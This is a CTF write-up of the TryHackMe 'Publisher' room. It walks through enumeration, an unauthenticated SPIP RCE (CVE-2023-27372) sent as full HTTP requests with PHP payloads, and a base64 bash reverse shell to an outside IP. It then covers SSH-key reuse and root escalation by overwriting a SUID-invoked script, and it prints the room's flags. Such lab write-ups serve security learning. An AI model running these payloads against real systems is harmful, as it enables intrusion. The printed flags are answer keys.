
[[TryHackMe]] Room

**Date**: 14/02/25 
**Target IP**: 10.10.207.110


> [!NOTE] Prompt
> The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

---
## **Initial Scanning**

### **[[nmap]]** :
- 22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))

---
## **Exploration and Enumeration**

Weird French blog page thing. The prompt says directory fuzzing so I ran dirsearch.

```
❯ dirsearch -u http://10.10.207.110 -t 50

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Target: http://10.10.207.110/

[15:33:42] Starting: 
[15:33:56] 403 -  278B  - /.ht_wsr.txt
[15:33:56] 403 -  278B  - /.htaccess.bak1
[15:33:56] 403 -  278B  - /.htaccess.orig
[15:33:56] 403 -  278B  - /.htaccess.sample
[15:33:56] 403 -  278B  - /.htaccess.save
[15:33:56] 403 -  278B  - /.htaccess_extra
[15:33:56] 403 -  278B  - /.htaccessBAK
[15:33:56] 403 -  278B  - /.htaccess_orig
[15:33:56] 403 -  278B  - /.htaccessOLD
[15:33:56] 403 -  278B  - /.htaccess_sc
[15:33:56] 403 -  278B  - /.htaccessOLD2
[15:33:56] 403 -  278B  - /.html
[15:33:56] 403 -  278B  - /.htm
[15:33:56] 403 -  278B  - /.htpasswds
[15:33:56] 403 -  278B  - /.htpasswd_test
[15:33:56] 403 -  278B  - /.httr-oauth
[15:34:00] 403 -  278B  - /.php
[15:35:00] 301 -  315B  - /images  ->  http://10.10.207.110/images/
[15:35:00] 200 -  624B  - /images/
[15:35:30] 403 -  278B  - /server-status/
[15:35:30] 403 -  278B  - /server-status
```

The /images/ directory gave directory listing but nothing very interesting.

Running ffuf indicated existence of a /spip/ directory.

```
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.207.110/FUZZ -t 100

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 6073ms]
spip                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 521ms]
```

Navigating to that and snooping around eventually got me to some spip login page and revealed the version of spip to be v2.4.0 as seen in HTTP headers and the `http://10.10.207.110/spip/local/config.txt` page. 

I searched or vulnerabilities regarding spip v2.4.0 and found the following detailing an unauthenticated RCE vulnerability exploiting poor implementation and input validation in the `oubli` parameter in the forgot-password functionality at `http://10.10.207.110/spip/spip.php?page=spip_pass&lang=en`:
https://www.exploit-db.com/exploits/50383
https://github.com/nuts7/CVE-2023-27372

---
## **Exploitation**

We can check for a PoC for this vulnerability using the following request where if successful the `phpinfo()` page is displayed :

```
POST /spip/spip.php?page=spip_pass&lang=en HTTP/1.1
Host: 10.10.207.110
Content-Length: 261
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.207.110
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.207.110/spip/spip.php?page=spip_pass&lang=en
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

page=spip_pass&lang=en&formulaire_action=oubli&formulaire_action_args=AKWms4U6q36PZ5anxAntOw96PbQ5RFxIFrvJYArFdIBdXpBrKWZ37WWgXOTXQ0A7YhaGg63PB3rY%2FwwNM0PLZgyIWBTRpmyAMQ%3D%3D&formulaire_action_sign=&oubli=abc%40xyz.com&oubli=s:19:"<?php phpinfo(); ?>";&nobot=
```

Its successful and hence we can go ahead and construct a payload to give me a reverse shell similar to the process seen in the THM [[Cheese]] room wherein I used https://revshells.com to generate a base64 encoded Bash -i revshell command and then constructed the payload.

```
❯ python3 spip-exploit.py -u http://10.10.207.110/ -c 'echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ=="| base64 -d | bash' -v
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:109:"<?php system('echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ=="| base64 -d | bash'); ?>";
```

Sent the following request : 

```
POST /spip/spip.php?page=spip_pass&lang=en HTTP/1.1
Host: 10.10.207.110
Content-Length: 354
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.207.110
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.207.110/spip/spip.php?page=spip_pass&lang=en
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

page=spip_pass&lang=en&formulaire_action=oubli&formulaire_action_args=AKWms4U6q36PZ5anxAntOw96PbQ5RFxIFrvJYArFdIBdXpBrKWZ37WWgXOTXQ0A7YhaGg63PB3rY%2FwwNM0PLZgyIWBTRpmyAMQ%3D%3D&formulaire_action_sign=&oubli=abc%40xyz.com&oubli=s:109:"<?php system('echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ=="| base64 -d | bash'); ?>";ba&nobot=
```

Reverse shell obtained as the `www-data` user.

I end up in the think user's home directory and am able to read the user flag.

```
www-data@41c976e507f8:/home/think$ cat user.txt
cat user.txt
fa229046d44eda6a3598c73ad96f4ca5 
```

---
## **Post-Exploitation**

wget is not present on the system and hence linpeas cannot be moved over.

Manually checked for SUID binaries but no suspicious ones detected : 

```
www-data@41c976e507f8:/$ find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
```

Found the think user's SSH keys in their home directory and used the id_rsa key to SSH into the machine as the think user.

```
❯ chmod 600 ./think_id_rsa 
 
❯ ssh -i ./think_id_rsa think@10.10.207.110
think@publisher:~$ 
```

---
## **Escalation**

Checking for SUID binaries as the think user gives me the following :

```
think@publisher:/tmp$ find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

I'm going to ignore the /usr/lib ones.

The only non-typical binary here is `/usr/sbin/run_container`. So I'm gonna look into that.

Running strings shows us the existence of a custom script which is called by this binary : 

```
think@publisher:~$ strings /usr/sbin/run_container
.......
/bin/bash
/opt/run_container.sh
.......
```

I can read it but I am unable to simply write to this script as something keeps blocking my write privileges.

The hint on THM says to look into AppArmor.

First I check which shell I'm using and apparently its `/usr/sbin/ash`.

I can then find the restrictions placed on me with :

```
think@publisher:~$ cat /etc/apparmor.d/usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

Looking further into the run_container.sh script a write-up tells me that docker is not called with its full path and hence could be susceptible to PATH injection.

But that is complicated.

Instead `scp` can be used to replace the /opt/run_container.sh with a malicious command :

```
❯ echo "/bin/bash -p" > run_container.sh

❯ scp -i think_id_rsa ./run_container.sh think@10.10.207.110:/opt/run_container.sh
run_container.sh                                     100%   13     0.0KB/s   00:00    
```

I can then run `/usr/sbin/run_container` which runs `/opt/run_container.sh` and gives me a root shell.

```
think@publisher:/var/tmp$ cat /opt/run_container.sh
/bin/bash -p
think@publisher:/var/tmp$ /usr/sbin/run_container

bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```


---
## **Summary**

- User Flag : fa229046d44eda6a3598c73ad96f4ca5
- Root Flag : 3a4225cc9e85709adda6ef55d6a4f2ca